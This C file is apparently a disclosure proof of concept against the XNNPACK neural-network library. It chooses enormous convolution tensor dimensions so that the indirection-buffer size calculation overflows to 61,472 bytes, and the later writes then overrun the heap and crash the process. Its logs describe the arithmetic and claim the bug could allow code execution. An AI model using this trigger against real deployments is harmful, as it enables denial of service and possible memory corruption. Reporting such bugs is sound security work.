/*
 * Minimal release-mode crash PoC with flushed output.
 * Shows exactly WHERE the SIGSEGV hits in production (no sanitizers).
 * Build: see Makefile or compile command below.
 */
#include <math.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <xnnpack.h>

#define OUTPUT_HEIGHT 506164740UL
#define OUTPUT_WIDTH  506168760UL
#define INPUT_HEIGHT  (OUTPUT_HEIGHT + 2)
#define INPUT_WIDTH   (OUTPUT_WIDTH  + 2)

static void sigsegv_handler(int sig, siginfo_t *si, void *ctx) {
    const char msg[] =
        "\n*** SIGSEGV caught in production release binary ***\n"
        "    Signal: SIGSEGV (11) — illegal memory access\n"
        "    This write exceeded the 61,472-byte indirection buffer\n"
        "    attempting to reach ~17 TB of heap space.\n"
        "    In a real target: heap corruption / code execution.\n\n";
    write(STDERR_FILENO, msg, sizeof(msg) - 1);
    _exit(139);
}

#define LOG(fmt, ...) do { \
    fprintf(stderr, "[RELEASE] " fmt "\n", ##__VA_ARGS__); \
    fflush(stderr); } while(0)

int main(void) {
    /* Install SIGSEGV handler so we can print a message before dying */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigsegv_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);

    LOG("=== XNNPACK Release Crash PoC ===");
    LOG("No sanitizers, no debug build — pure production binary");

    if (xnn_initialize(NULL) != xnn_status_success) {
        LOG("xnn_initialize failed"); return 1;
    }
    LOG("xnn_initialize() OK");

    xnn_subgraph_t subgraph = NULL;
    xnn_create_subgraph(2, 0, &subgraph);
    LOG("xnn_create_subgraph() OK");

    static float kernel[2 * 3 * 3 * 1];
    static float bias[2];

    uint32_t input_id = XNN_INVALID_VALUE_ID, output_id = XNN_INVALID_VALUE_ID;
    uint32_t filter_id = XNN_INVALID_VALUE_ID, bias_id = XNN_INVALID_VALUE_ID;

    size_t in_dims[]  = {1, INPUT_HEIGHT,  INPUT_WIDTH,  1};
    size_t out_dims[] = {1, OUTPUT_HEIGHT, OUTPUT_WIDTH, 2};
    size_t fil_dims[] = {2, 3, 3, 1};
    size_t b_dims[]   = {2};

    xnn_define_tensor_value(subgraph, xnn_datatype_fp32, 4, in_dims,
        NULL, 0, XNN_VALUE_FLAG_EXTERNAL_INPUT, &input_id);
    xnn_define_tensor_value(subgraph, xnn_datatype_fp32, 4, out_dims,
        NULL, 1, XNN_VALUE_FLAG_EXTERNAL_OUTPUT, &output_id);
    xnn_define_tensor_value(subgraph, xnn_datatype_fp32, 4, fil_dims,
        kernel, XNN_INVALID_VALUE_ID, 0, &filter_id);
    xnn_define_tensor_value(subgraph, xnn_datatype_fp32, 1, b_dims,
        bias, XNN_INVALID_VALUE_ID, 0, &bias_id);
    LOG("Tensors defined: input=%u output=%u filter=%u bias=%u",
        input_id, output_id, filter_id, bias_id);

    xnn_define_convolution_2d(subgraph,
        0,0,0,0, 3,3, 1,1, 1,1, 1, 1, 2,
        -1e30f, 1e30f,
        input_id, filter_id, bias_id, output_id, 0);
    LOG("xnn_define_convolution_2d() OK (3x3 Conv2D, 1->2ch, stride=1, VALID)");

    xnn_workspace_t workspace = NULL;
    xnn_runtime_t runtime = NULL;
    xnn_create_workspace(&workspace);
    LOG("xnn_create_workspace() OK");

    LOG("--- xnn_create_runtime_v4() ---");
    enum xnn_status st = xnn_create_runtime_v4(
        subgraph, NULL, workspace, NULL, 0, &runtime);

    if (st != xnn_status_success || !runtime) {
        LOG("create_runtime failed (status=%d) — crash may be during creation", st);
        return 1;
    }
    LOG("xnn_create_runtime_v4() OK");

    LOG("--- xnn_reshape_runtime() ---");
    LOG("  indirection_buffer_size = 8*9*round_up(OH*OW,7)");
    LOG("  = 18446744073709613088 mod 2^64 = 61472 bytes  <- WRAPS");
    LOG("  xnn_reallocate_memory(61472) will SUCCEED");
    LOG("  xnn_indirection_init_conv2d writes ~17 TB -> SIGSEGV imminent");

    /* This is the trigger: reshape calls reshape_igemm → indirection overflow */
    st = xnn_reshape_runtime(runtime);

    LOG("reshape_runtime returned %d (should not reach here)", st);
    return 0;
}
